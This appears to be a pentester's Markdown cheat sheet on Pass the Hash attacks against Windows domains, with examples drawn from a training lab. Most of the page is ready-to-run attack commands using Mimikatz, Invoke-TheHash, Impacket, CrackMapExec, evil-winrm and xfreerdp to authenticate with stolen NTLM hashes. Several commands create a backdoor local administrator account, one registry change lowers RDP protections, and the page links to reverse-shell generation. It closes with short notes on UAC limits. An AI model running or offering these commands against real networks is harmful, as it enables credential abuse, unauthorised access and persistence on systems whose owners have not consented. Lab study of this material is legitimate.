---
title: Pass The Hash
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
  - lateral movement
---
# Pass The Hash

A [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. With NTLM, passwords stored on the server and domain controller are not "salted," which means that an adversary with a password hash can authenticate a session without knowing the original password.

The attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:

- Dumping the local SAM database from a compromised host.
- Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
- Pulling the hashes from memory (lsass.exe).



## Pass the Hash with Mimikatz (Windows)

see [mimikatz](mimikatz.md)

```powershell
# Pass The Hash attack in windows:
# 1. Run mimikatz
mimikatz.exe privilege::debug "sekurlsa::pth /user:<username> /rc4:<NTLM hash> /domain:<DOMAIN> /run:<Command>" exit
# sekurlsa::pth is a module that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password
# /user: the user we want to impersonate
# /rc4:<NTLM hash>: /rc4 or /NTLM - NTLM hash of the user's password.
# /run:<Command>: For example /run:cmd.exe

# 2. After that, we can use cmd.exe to execute commands in the user's context. 

# Example:
# .\mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

```


## Pass the Hash with PowerShell Invoke-TheHash (Windows)

[See Powershell Invoke-TheHash](invoke-the-hash.md). This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. 

Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer.

When using Invoke-TheHash, we have two options: SMB or WMI command execution.

```powershell
cd C:\tools\Invoke-TheHash\

Import-Module .\Invoke-TheHash.psd1
```


### Invoke-TheHash with SMB

```powershell
Invoke-SMBExec -Target $ip -Domain <DOMAIN> -Username <USERNAME> -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
# Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.
# we can execute `Invoke-TheHash` to execute our PowerShell reverse shell script in the target computer.

# Example:
# Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

[How to generate a reverse shell](reverse-shells.md).

### Invoke-TheHash with WMI

```powershell
Import-Module .\Invoke-TheHash.psd1

Invoke-WMIExec -Target $machineName -Domain <DOMAIN> -Username <USERNAME> -Hash 64F12CDDAA88057E06A81B54E73B949B -Command  "net user mark Password123 /add && net localgroup administrators mark /add" 

# Example:
# Invoke-WMIExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

[How to generate a reverse shell](reverse-shells.md).


## Pass the Hash with Impacket (Linux)

### Pass the Hash with Impacket PsExec

```bash
impacket-psexec <username>@$ip -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

### Pass the Hash with impacket-wmiexec

Download from: [https://github.com/fortra/impacket/blob/master/examples/wmiexec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py).

```shell-session
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```


### Pass the Hash with  impacket-atexec

Download from:  [https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)


### Pass the Hash with  impacket-smbexec

Download from: [https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

```bash
python3 smbexec.py -hashes :$NTLMhash Administrator@<TARGET-IP>

# Example:
python3 smbexec.py -hashes :bac9dc5b7b4bec1d83e0e9c04b477f26 Administrator@10.129.138.81
```


## Pass the Hash with CrackMapExec (Linux)

See [CrackMapExec](crackmapexec.md)

```powershell

# Using a hash instead of a password, to authenticate ourselves
crackmapexec smb $ip -u <username> -H <hash> -d <DOMAIN>

# Execute commands with flag -x
crackmapexec smb $ip/24 -u <Administrator> -d . -H <hash> -x whoami
```


## Pass the Hash with evil-winrm (Linux)

See [evil-winrm](evil-winrm.md).

If SMB is blocked or we don't have administrative rights, we can use this alternative protocol to connect to the target machine.

```bash
evil-winrm -i $ip -u <username> -H <hash>
```


## Pass the Hash with RDP (Linux)

```bash
xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:$ip
# /pth:<hash>   Pass the hash

# Example:
# xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

```

**Restricted Admin Mode**, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with an error. This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access.


## UAC Limits Pass the Hash for Local Accounts

UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.

>Note: There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account. ´